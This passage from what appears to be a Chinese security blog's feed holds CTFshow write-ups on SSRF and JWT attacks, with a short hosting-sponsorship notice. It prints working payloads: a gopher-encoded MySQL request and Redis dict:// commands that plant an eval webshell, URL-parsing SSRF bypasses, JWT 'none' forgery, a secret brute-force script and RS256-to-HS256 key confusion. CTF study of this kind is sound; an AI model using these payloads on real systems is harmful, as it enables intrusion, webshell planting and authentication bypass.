<span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> scheme</code></pre><ol><li><code>$ip = gethostbyname($x[&#39;host&#39;]);</code>：使用<code>gethostbyname</code>函数获取URL主机名对应的IP地址。</li><li><code>if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</code>：使用<code>filter_var</code>函数和相应的过滤器检查IP地址是否有效，并且不是私有地址或保留地址。如果IP地址无效，将执行<code>die(&#39;ip!&#39;);</code>终止脚本执行。</li></ol><ul><li><code>filter_var</code>：这是PHP内置的函数，用于过滤变量并进行验证。它接受两个参数：第一个是要验证的变量，第二个是过滤选项。</li><li><code>FILTER_VALIDATE_IP</code>：这是一个用于 <code>filter_var</code> 的选项，用来验证提供的变量是否是一个有效的IP地址。</li><li><code>FILTER_FLAG_NO_PRIV_RANGE</code>：这是一个可选的标志，用来排除私有IP地址范围。私有IP地址通常用于内部网络，并不在互联网上路由。这些地址包括以下范围：</li><li><ul><li><code>10.0.0.0</code> 到 <code>10.255.255.255</code></li><li><code>172.16.0.0</code> 到 <code>172.31.255.255</code></li><li><code>192.168.0.0</code> 到 <code>192.168.255.255</code></li></ul></li><li><code>FILTER_FLAG_NO_RES_RANGE</code>：这是另一个可选的标志，用来排除保留的IP地址范围。保留的IP地址通常不分配给特定的网络设备，而用于特殊用途，如多播地址。</li><li><code>$ip</code>：这是要验证的IP地址变量。</li><li><code>if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))</code>：这条 <code>if</code> 语句检查 <code>$ip</code> 是否通过了验证。如果 <code>$ip</code> 不是一个有效的IP地址，或者是一个私有或保留的IP地址，<code>filter_var</code> 将返回 <code>false</code>，然后执行 <code>if</code> 语句块内的代码。</li></ul><p>利用302跳转和dns重绑定都可以。<br>在自己服务器上写个index.php文件内容如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location:http://127.0.0.1/flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></code></pre><p>Payload：</p><pre class="language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//xxx.xxx.xxx.xx/xxx.php</span></code></pre><h4 id="web358-127-0-0-1"><a href="#web358-127-0-0-1" class="headerlink" title="web358(@127.0.0.1)"></a>web358(@127.0.0.1)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>正则表达式的意思是以<a href="http://ctf./">http://ctf.</a>开头，以show结尾。</p><p>以show结尾比较好办，要么#show，要么?a&#x3D;show这样的都可以。</p><p>以<a href="http://ctf.开头的话，加上一个@127.0.0.1就可以绕过了，这样parse_url解析出来的host是127.0.0.1，考虑到ftp：">http://ctf.开头的话，加上一个@127.0.0.1就可以绕过了，这样parse_url解析出来的host是127.0.0.1，考虑到ftp：</a></p><p><a href="ftp://user[:pass]@ip[:port]/path，因此前面的ctf.会被解析成user。">ftp://user[:pass]@ip[:port]/path，因此前面的ctf.会被解析成user。</a></p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token comment">//ctf.@127.0.0.1/flag.php#show</span></code></pre><h4 id="web359-mysql-gopherus"><a href="#web359-mysql-gopherus" class="headerlink" title="web359(mysql gopherus)"></a>web359(mysql gopherus)</h4><p>Hint:打无密码的mysql</p><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470">SSRF利用 Gopher 协议拓展攻击面</a></p><p><a href="https://blog.csdn.net/crisprx/article/details/104251284">SSRF利用 Gopher |Gopher攻击mysql及内网</a></p><p><img src="web359.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%30%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01</span></code></pre><p>把<code>_</code>后的再进行一次url编码</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2530%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501</span></code></pre><p>最后访问1.php进行RCE即可</p><h4 id="web360-redis"><a href="#web360-redis" class="headerlink" title="web360(redis)"></a>web360(redis)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>ssrf打redis，基本上四种攻击方式：</p><ul><li>写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li><li>主从复制</li></ul><p>这题肯定是写shell了，先利用dict探测一下端口，看看6379存不存在，如果目标的redis换端口了，就利用dict协议来探测：</p><p><img src="web360.png" loading="lazy"></p><p><a href="https://xz.aliyun.com/t/5665?time__1311=n4+xni5mqYqQw4CqGNDQTbm2+G8febDBmGoD">浅析Redis中SSRF的利用</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/113853929">CTFshow ssrf</a></p><pre class="language-php" data-language="php"><code class="language-php"># 设置一下dir，即本地数据库存放目录：dict://127.0.0.1:6379/config:set:dir:/var/www/html# 写马，可能会有转义或者过滤的情况，所以用16进制一般都能写成功。# <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>dict://127.0.0.1:6379/set:shell:"\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x30\x5d\x29\x3b\x3f\x3e"# 设置文件dict://127.0.0.1:6379/config:set:dbfilename:hsad.php# 保存dict://127.0.0.1:6379/save# 访问hsad.php进行rce</code></pre><p>当然也可以使用gopherus</p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-JWT</title>
      <link href="/2024/07/27/web%E5%85%A5%E9%97%A8-JWT/"/>
      <url>/2024/07/27/web%E5%85%A5%E9%97%A8-JWT/</url>
      
        <content type="html"><![CDATA[<h3 id="JWT浅析"><a href="#JWT浅析" class="headerlink" title="JWT浅析"></a>JWT浅析</h3><p>JWT即JSON WEB TOKEN，由三个部分组成，并用两个“.”进行连接。第一部分为header（base64加密），第二部分为payload（base64加密），第三部分为verify signature，它的构成如下：</p><p><img src="begin.png" loading="lazy"></p><p>HEADER中alg对应的加密方式为HS256，也可以选择其他对称或非对称的加密方式，大同小异。</p><p>PAYLOAD中一般包括用户信息。</p><p>Verify Signature中包括加密的密码。</p><p>JWT本质上是一种校验值，用来验证身份和数据是否被更改。</p><h3 id="web345-350"><a href="#web345-350" class="headerlink" title="web345-350"></a>web345-350</h3><h4 id="web345-none"><a href="#web345-none" class="headerlink" title="web345(none)"></a>web345(none)</h4><p>查看源码得到Hint<code>/admin</code></p><p>访问后抓包看到cookie</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjIwNTgwNTksImV4cCI6MTcyMjA2NTI1OSwibmJmIjoxNzIyMDU4MDU5LCJzdWIiOiJ1c2VyIiwianRpIjoiMzQ4NWJkNjFmY2MwZjFhNjY4NDNhYzlhYTBhMzZjNzEifV0</span></span></code></pre><p>用<code>.</code>将其分为两半分别base64解码</p><pre class="language-php" data-language="php"><code class="language-php">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0 <span class="token operator">--</span><span class="token operator">></span>  <span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"alg"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"None"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"typ"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"jwt"</span><span class="token punctuation">&#125;</span>W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3MjIwNTgwNTksImV4cCI6MTcyMjA2NTI1OSwibmJmIjoxNzIyMDU4MDU5LCJzdWIiOiJ1c2VyIiwianRpIjoiMzQ4NWJkNjFmY2MwZjFhNjY4NDNhYzlhYTBhMzZjNzEifV0  <span class="token operator">--</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"iss"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"iat"</span><span class="token punctuation">:</span><span class="token number">1722058059</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"exp"</span><span class="token punctuation">:</span><span class="token number">1722065259</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"nbf"</span><span class="token punctuation">:</span><span class="token number">1722058059</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"sub"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jti"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"3485bd61fcc0f1a66843ac9aa0a36c71"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span></code></pre><p>然后将后半部分改为<code>[&#123;&quot;sub&quot;:&quot;admin&quot;&#125;]</code>base64编码后与第一部分拼接</p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0A.W3sic3ViIjoiYWRtaW4ifV0</code></pre><p>发送得到flag</p><h4 id="web346-348-HS256"><a href="#web346-348-HS256" class="headerlink" title="web346-348(HS256)"></a>web346-348(HS256)</h4><p>这次使用了HS256加密，主要就是爆破key，网上有很多方法，这里我使用的是<a href="https://github.com/Aiyflowers/JWT_GUI">JWT_GUI</a></p><p><img src="web346.png" loading="lazy"></p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTcyMjA2MjAzMSwiZXhwIjoxNzIyMDY5MjMxLCJuYmYiOjE3MjIwNjIwMzEsInN1YiI6ImFkbWluIiwianRpIjoiNjUwZWVkZWVjNDAwYTA2ZTAxNWM1NjUzOWNkMmY5MTAifQ.Q2JT2tqgC8JogIjUH6PNNQN3_MY3QmDp8LK6aBj7Pfs</code></pre><p>这里也有py爆破脚本</p><pre class="language-python" data-language="python"><code class="language-python">python <span class="token punctuation">.</span><span class="token operator">/</span>pydictor<span class="token punctuation">.</span>py <span class="token operator">-</span>base d <span class="token operator">-</span><span class="token operator">-</span><span class="token builtin">len</span> <span class="token number">1</span> <span class="token number">6</span> <span class="token operator">-</span>o nums1_6<span class="token punctuation">.</span>txt</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwt<span class="token keyword">import</span> json<span class="token keyword">def</span> <span class="token function">runblasting</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>jwt_str<span class="token punctuation">,</span>alg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">"none"</span><span class="token punctuation">:</span>        alg <span class="token operator">=</span> <span class="token string">"HS256"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>            key_ <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'use '</span><span class="token operator">+</span>key_<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jwt_str<span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>key<span class="token operator">=</span>key_<span class="token punctuation">,</span>algorithms<span class="token operator">=</span>alg<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'found key! -->'</span> <span class="token operator">+</span> key_<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">,</span> jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidAudienceError<span class="token punctuation">,</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidIssuedAtError<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'found key! -->'</span> <span class="token operator">+</span> key_<span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>InvalidSignatureError<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"key not found!"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> <span class="token string">'./nums1_6.txt'</span>    jwt_str <span class="token operator">=</span> <span class="token string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMjY2NzAxMywiZXhwIjoxNjMyNjc0MjEzLCJuYmYiOjE2MzI2NjcwMTMsInN1YiI6InVzZXIiLCJqdGkiOiIyNzM3NjJhOWU1NjZhMmIzNDJhYjUxN2VjNDNiOWY5YSJ9.4sf78nrf_g84F9m0Bpgbvn8fC1YkECCFZPd5U9tULYg"</span>    alg <span class="token operator">=</span> <span class="token string">'HS256'</span>    runblasting<span class="token punctuation">(</span>path<span class="token punctuation">,</span>jwt_str<span class="token punctuation">,</span>alg<span class="token punctuation">)</span></code></pre><p>348 key : aabb</p><h4 id="web349-RS256"><a href="#web349-RS256" class="headerlink" title="web349(RS256)"></a>web349(RS256)</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// app.js</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'//public//private.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'user'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'RS256'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'auth'</span><span class="token punctuation">,</span>token<span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">"flag_here"</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> auth <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>auth<span class="token punctuation">;</span><span class="token keyword">var</span> cert <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'//public/public.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// get public key</span>jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>auth<span class="token punctuation">,</span> cert<span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> decoded</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>decoded<span class="token punctuation">.</span>user<span class="token operator">===</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'you are not admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用了RS256加密，但是公私钥都可以访问到</p><p>同上工具</p><pre class="language-http" data-language="http"><code class="language-http">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjIwNjM2OTd9.tUleRykg1PvGpCF1_mpKka0XK0eYp0X68cYVDnexuzy1gHWlEnAtOqSuwSclFSeLqHPGhIuWWCbyMlLuj9H8E-wq2l3GZYIzbiDLjR6C0XDwVQqP2eSgP1E00bSedY-fJtsDD9Jwwk-Xu9sG5Zo56dkoUmo51vXuJimGiVj1HDU</code></pre><h4 id="web350-RS256-HS256"><a href="#web350-RS256-HS256" class="headerlink" title="web350(RS256 -&gt; HS256)"></a>web350(RS256 -&gt; HS256)</h4><p>可以根据公钥，修改算法从 非对称算法（比如RS256） 到 对称密钥算法（HS256）双方都使用公钥验签，顺利篡改数据</p><p>当公钥可以拿到时，如果使用对称密码，则对面使用相同的公钥进行解密，实现验签通过</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> privateKey <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\\public.key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// console.log(privateKey);</span><span class="token keyword">var</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">user</span><span class="token operator">:</span> <span class="token string">'admin'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> privateKey<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'HS256'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="token punctuation">.</span>eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjIwNjUxMDl9<span class="token punctuation">.</span>M40dyhCvr5aIUAy_mEqCYJC8TAcbNrx02HOfhl<span class="token operator">-</span><span class="token constant">GRIU</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DK盾-CTFers赞助计划</title>
      <link href="/2024/07/26/DK%E7%9B%BE/"/>
      <url>/2024/07/26/DK%E7%9B%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="DK盾-CTFers赞助计划推广"><a href="#DK盾-CTFers赞助计划推广" class="headerlink" title="DK盾-CTFers赞助计划推广"></a>DK盾-CTFers赞助计划推广</h1><p>CTFers可获得DK盾赞助服务器，非常之物美价廉，欢迎师傅们</p><p><strong>参与条件：</strong></p><ol><li>参与过5个以上国内CTF赛事，附上相关证明。</li><li>每月在个人技术博客上至少更新1篇原创文章（CTF技术相关），总量10篇以上。</li><li>博客底部挂有DK盾赞助标识或发布一篇推广文章。</li></ol><p><strong>续费条件：</strong></p><ol><li>满足以上参与条件的第2和第3项。</li><li>积极参与CTF赛事。</li><li>每月续费1元。</li></ol><p><strong>升级条件：</strong></p><ol><li>博客文章数量质量和赛事排名有所提高</li><li>推广DK盾软文&#x2F;测评</li><li>按实际需求</li></ol><p><strong>CTF团队福利：</strong></p><ul><li>高防CDN</li><li>高防机柜免费托管等</li></ul><h4 id="满足条件的师傅可以去官网提交工单奥"><a href="#满足条件的师傅可以去官网提交工单奥" class="headerlink" title="满足条件的师傅可以去官网提交工单奥"></a>满足条件的师傅可以去官网提交工单奥</h4><h3 id="QQ-群-727077055"><a href="#QQ-群-727077055" class="headerlink" title="QQ 群: 727077055"></a>QQ 群: 727077055</h3>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>web入门-nodejs</title>
      <link href="/2024/07/25/web%E5%85%A5%E9%97%A8-nodejs/"/>
      <url>/2024/07/25/web%E5%85%A5%E9%97%A8-nodejs/</url>
      
